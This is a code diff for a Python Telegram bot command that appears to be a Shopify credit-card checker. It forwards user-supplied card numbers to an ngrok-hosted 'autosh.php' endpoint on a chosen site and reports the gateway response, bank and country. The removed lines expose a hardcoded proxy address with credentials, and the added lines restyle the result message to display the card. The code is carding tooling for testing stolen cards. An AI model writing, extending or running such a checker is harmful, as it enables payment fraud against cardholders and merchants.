@@ -2857,10 +2857,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Consume credit
     if not await consume_credit(user_id):
-        await update.message.reply_text(
-            "❌ You have no credits left.",
-            parse_mode=ParseMode.HTML
-        )
+        await update.message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
         return
 
     # Fetch user custom site URL
@@ -2868,7 +2865,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     custom_url = user_data.get("custom_url")
     if not custom_url:
         await update.message.reply_text(
-            "❌ You don't have a site set. Use /seturl to set your site first.",
+            "❌ 𝓨𝓸𝓾 𝓭𝓸𝓷'𝓽 𝓱𝓪𝓿𝓮 𝓪 𝓼𝓲𝓽𝓮 𝓼𝓮𝓽. 𝓤𝓼𝓮 /seturl 𝓽𝓸 𝓼𝓮𝓽 𝔂𝓸𝓾𝓻 𝓼𝓲𝓽𝓮 𝓯𝓲𝓻𝓼𝓽.",
             parse_mode=ParseMode.HTML
         )
         return
@@ -2888,16 +2885,21 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     country_flag = bin_details.get("country_emoji", "")
 
     # API call
-    api_url = (
-        f"https://7feeef80303d.ngrok-free.app/autosh.php"
-        f"?cc={card_input}&site={custom_url}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-    )
+    api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=120) as resp:
                 api_text = await resp.text()
 
-        # Remove PHP warnings and HTML tags
+        # --- Detect HTML or PHP warnings ---
+        if '<!DOCTYPE html>' in api_text or '<html' in api_text:
+            await msg.edit_text(
+                "❌ API endpoint is offline or returned HTML. Please check your ngrok URL.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- Strip PHP warnings / HTML tags ---
         clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
         json_start = clean_text.find('{')
         if json_start != -1:
@@ -2916,22 +2918,30 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         response_text = data.get("Response", "Unknown")
         price = f"{data.get('Price', '1.0')}$"  # $ at the end
         gateway = data.get("Gateway", "-")
-
+        country = f"{country_flag} {country_name}"
         requester = f"@{user.username}" if user.username else str(user.id)
+
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        # Formatted response
+        BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"
+        bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
+
         formatted_msg = (
-            "═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n"
-            f"[✗] 𝐒𝐢𝐭𝐞 ➜ {custom_url}\n"
-            f"[✗] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gateway}\n"
-            f"[✗] 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {price}\n"
-            "――――――――――――――――\n"
-            f"[✗] 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
-            f"[✗] 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
-            "――――――――――――――――"
+            f"═══[ <b>𝗔𝘂𝘁𝗼𝘀𝗵𝗼𝗽𝗶𝗳𝘆</b> ]═══\n"
+            f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{escape(card_input)}</code>\n"
+            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮\n"
+            f"{bullet_link} <b>𝐀𝐦𝐨𝐮𝐧𝐭</b> ➜ {price}\n"
+            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response_text)}</i>\n"
+            f"――――――――――――――――\n"
+            f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ {brand}\n"
+            f"{bullet_link} <b>𝐁𝐚𝐧𝐤</b> ➜ {issuer}\n"
+            f"{bullet_link} <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b> ➜ {country}\n"
+            f"――――――――――――――――\n"
+            f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</b> ➜ {requester}\n"
+            f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
+            f"――――――――――――――――"
         )
 
         await msg.edit_text(
@@ -2951,6 +2961,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
